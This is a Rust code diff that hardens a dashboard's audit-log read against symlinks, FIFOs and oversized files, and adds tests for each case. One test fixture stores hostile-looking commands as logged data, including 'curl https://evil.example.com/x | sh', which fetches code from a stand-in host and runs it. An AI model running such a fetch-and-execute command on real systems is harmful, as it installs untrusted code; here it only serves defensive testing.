@@ -284,10 +284,25 @@ fn build_audit_summary(audit_log: Option<&Path>, since: &str, until: &str) -> Op
         Some(p) => p.to_path_buf(),
         None => crate::audit::audit_log_path()?,
     };
-    if !path.exists() {
-        return None;
-    }
-    let read = audit_aggregator::read_log(&path).ok()?;
+    // HARDENED READ (CodeRabbit M13 PR #132): the audit log path can be
+    // caller-supplied (`audit_log`) or the default state-dir path; either way a
+    // plain `std::fs::read_to_string` (what `audit_aggregator::read_log` uses)
+    // follows symlinks, applies no size cap, and would BLOCK on a FIFO/device —
+    // so a log symlinked at `/dev/zero` (or an unbounded file) could hang or OOM
+    // the render. This was the MISSED read path: the policy/trust reads were
+    // already hardened in earlier rounds. Route the read through the shared,
+    // race-free `read_regular_capped` (opens with `O_NONBLOCK`, `fstat`s the
+    // OPEN fd to reject non-regular files without blocking, and caps the body),
+    // then feed the bounded content to `audit_aggregator::parse_log` for the
+    // SAME parse + malformed-line accounting `read_log` performs. A read error
+    // (absent / non-regular / oversize / unreadable) degrades to `None`, exactly
+    // like the previous `.exists()` + `read_log(..).ok()?` — never a panic or
+    // hang. (The prior `path.exists()` precheck is dropped: it was a TOCTOU-prone
+    // duplicate of the open, and `read_regular_capped`'s `NotFound` already maps
+    // to the same `None` degrade.)
+    let bytes = crate::util::read_regular_capped(&path, AUDIT_READ_CAP).ok()?;
+    let content = String::from_utf8(bytes).ok()?;
+    let read = audit_aggregator::parse_log(&content, Some(&path));
 
     let filter = AuditFilter {
         since: Some(since.to_string()),
@@ -347,6 +362,18 @@ fn top_hosts(records: &[AuditRecord]) -> Vec<(String, usize)> {
 /// small hand-authored document; 1 MiB is far above any legitimate size and
 /// bounds the in-memory buffer when the path is attacker-influenced.
 const POLICY_READ_CAP: u64 = 1024 * 1024;
+
+/// Read cap for the JSONL audit log. Unlike the policy/trust files this is an
+/// append-only machine-written log that legitimately grows over time and has no
+/// in-tree rotation, so the cap is much larger — 64 MiB, mirroring the order of
+/// magnitude of the runner's 10 MiB download cap but with generous headroom for
+/// a long-lived log. The cap exists only to bound the in-memory buffer (and to
+/// not block on a FIFO / not follow a symlink to a device) when `audit_log` is
+/// attacker-influenced; on the (rare) over-cap log the dashboard degrades to an
+/// empty audit summary rather than buffering an unbounded file. The 7-day window
+/// filter runs over whatever fits, so a normally-sized log is always summarized
+/// in full.
+const AUDIT_READ_CAP: u64 = 64 * 1024 * 1024;
 
 /// Read cap for a `trust.json` store. The dashboard only counts entries, so even
 /// a large store is bounded well under this for the snapshot's purposes.
@@ -1760,6 +1787,140 @@ mod tests {
             count_trust_entries(&trust),
             0,
             "an oversized trust.json must count as zero (refused before buffering)"
+        );
+    }
+
+    #[test]
+    fn build_audit_summary_reads_valid_log_through_capped_reader() {
+        // Happy path: a real, in-window JSONL audit log must still produce a
+        // POPULATED summary after the hardened-read refactor (capped read +
+        // `parse_log`). Two verdict records inside the window → 2 commands; one
+        // blank line and one malformed line exercise `parse_log`'s skip +
+        // `skipped_lines` accounting (unchanged from `read_log`). We build each
+        // line by serializing a real `AuditRecord` so the JSON shape matches the
+        // parser exactly.
+        let mut rec = AuditRecord {
+            timestamp: "2026-05-30T00:00:00Z".into(),
+            session_id: "s1".into(),
+            action: "Warn".into(),
+            rule_ids: vec!["plain_http".into()],
+            command_redacted: "wget http://evil.example.com/y".into(),
+            bypass_requested: false,
+            bypass_honored: false,
+            interactive: false,
+            policy_path: None,
+            event_id: None,
+            tier_reached: 3,
+            entry_type: "verdict".into(),
+            event: None,
+            integration: None,
+            hook_type: None,
+            detail: None,
+            elapsed_ms: None,
+            raw_action: None,
+            raw_rule_ids: None,
+            trust_pattern: None,
+            trust_rule_id: None,
+            trust_action: None,
+            trust_ttl_expires: None,
+            trust_scope: None,
+            agent_origin: None,
+        };
+        let line1 = serde_json::to_string(&rec).unwrap();
+        rec.action = "Block".into();
+        rec.command_redacted = "curl https://evil.example.com/x | sh".into();
+        let line2 = serde_json::to_string(&rec).unwrap();
+        let log_body = format!("{line1}\n\n{line2}\nnot-json-at-all\n");
+
+        let dir = tempfile::tempdir().unwrap();
+        let log = dir.path().join("log.jsonl");
+        std::fs::write(&log, log_body).unwrap();
+
+        let summary =
+            build_audit_summary(Some(&log), "1970-01-01T00:00:00Z", "2999-01-01T00:00:00Z")
+                .expect("a valid in-window log must produce a populated summary");
+        assert_eq!(
+            summary.total_commands, 2,
+            "both verdict records inside the window are counted"
+        );
+        assert_eq!(
+            summary.skipped_lines, 1,
+            "the one malformed line is skipped and accounted for (blank lines are not)"
+        );
+        assert!(
+            summary
+                .top_hosts
+                .iter()
+                .any(|(h, _)| h == "evil.example.com"),
+            "the redacted previews' host is tallied; got {:?}",
+            summary.top_hosts
+        );
+    }
+
+    #[test]
+    fn build_audit_summary_non_regular_path_degrades_to_none() {
+        // CodeRabbit M13 PR #132: the audit-log path can be caller-supplied. A
+        // NON-REGULAR path (here a directory) must collapse to the SAME safe
+        // degrade (`None`, no audit summary) a missing/unreadable log takes — via
+        // `read_regular_capped`'s `NotRegularFile` rejection — never a panic. We
+        // pass the path explicitly, so no env isolation is needed (only the audit
+        // read is exercised). `since`/`until` are arbitrary; the read fails first.
+        let dir = tempfile::tempdir().unwrap();
+        let log = dir.path().join("log.jsonl");
+        std::fs::create_dir_all(&log).unwrap();
+        let summary =
+            build_audit_summary(Some(&log), "1970-01-01T00:00:00Z", "2999-01-01T00:00:00Z");
+        assert!(
+            summary.is_none(),
+            "a non-regular audit log must degrade to None (safe), not panic"
+        );
+    }
+
+    #[test]
+    fn build_audit_summary_oversized_log_degrades_to_none() {
+        // CodeRabbit M13 PR #132: an OVERSIZED audit log (> AUDIT_READ_CAP) is
+        // refused by `read_regular_capped` BEFORE it is buffered, so
+        // `build_audit_summary` degrades to `None` rather than reading an
+        // unbounded file into memory. We write one byte past the cap; the content
+        // is otherwise-valid-ish bytes so rejection is proven to be on SIZE, not a
+        // parse failure (an oversized-but-parseable log would still be refused).
+        let dir = tempfile::tempdir().unwrap();
+        let log = dir.path().join("log.jsonl");
+        let oversized = vec![b'\n'; (AUDIT_READ_CAP as usize) + 1];
+        std::fs::write(&log, &oversized).unwrap();
+        let summary =
+            build_audit_summary(Some(&log), "1970-01-01T00:00:00Z", "2999-01-01T00:00:00Z");
+        assert!(
+            summary.is_none(),
+            "an oversized audit log must degrade to None (refused before buffering)"
+        );
+    }
+
+    /// CodeRabbit M13 PR #132: a FIFO at the audit-log path would BLOCK a plain
+    /// `std::fs::read_to_string` (what `read_log` uses) forever waiting for a
+    /// writer. The hardened `read_regular_capped` opens with `O_NONBLOCK` and
+    /// rejects the non-regular target, so `build_audit_summary` returns PROMPTLY
+    /// with the `None` degrade. If the read regressed to a blocking slurp this
+    /// test would HANG (caught by the suite timeout). Unix-only (needs `mkfifo`).
+    #[cfg(unix)]
+    #[test]
+    fn build_audit_summary_fifo_log_does_not_hang() {
+        use std::ffi::CString;
+        let dir = tempfile::tempdir().unwrap();
+        let fifo = dir.path().join("log.jsonl");
+        let c_path = CString::new(fifo.as_os_str().to_str().unwrap()).unwrap();
+        let rc = unsafe { libc::mkfifo(c_path.as_ptr(), 0o600) };
+        if rc != 0 {
+            eprintln!("skipping: mkfifo unsupported here");
+            return;
+        }
+        // Must complete promptly; a blocking read on the writer-less FIFO would
+        // hang here. The non-regular FIFO degrades to None.
+        let summary =
+            build_audit_summary(Some(&fifo), "1970-01-01T00:00:00Z", "2999-01-01T00:00:00Z");
+        assert!(
+            summary.is_none(),
+            "a FIFO at the audit-log path must degrade to None (and not hang)"
         );
     }
 
